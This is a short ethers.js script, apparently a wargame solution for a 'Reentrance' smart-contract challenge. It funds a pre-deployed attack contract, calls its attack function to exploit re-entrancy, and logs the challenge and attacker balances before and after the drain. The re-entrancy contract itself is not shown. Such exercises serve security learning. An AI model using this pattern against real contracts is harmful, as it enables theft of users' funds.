(async () => {
    const account = await ethers.getSigner();
    const chall = await ethers.getContractAt("Reentrance", process.env.INSTANCE, account)
    const attack = await ethers.getContractAt("Attack", "0xB5B84ef6bE447D5bBa7d1dD5c152a0f10E9332Ba", account)
    
    tx = await chall.donate(attack.address, {value: ethers.utils.parseEther("0.001")})
    await tx.wait();

    cbalance = await ethers.provider.getBalance(chall.address);
    abalance = await ethers.provider.getBalance(attack.address);
    log(`chall Balance : ${ethers.utils.formatEther(cbalance)}`);
    log(`attack Balance : ${ethers.utils.formatEther(abalance)}`);

    tx = await attack.attack();
    await tx.wait();

    cbalance = await ethers.provider.getBalance(chall.address);
    abalance = await ethers.provider.getBalance(attack.address);
    log(`chall Balance : ${ethers.utils.formatEther(cbalance)}`);
    log(`attack Balance : ${ethers.utils.formatEther(abalance)}`);
})();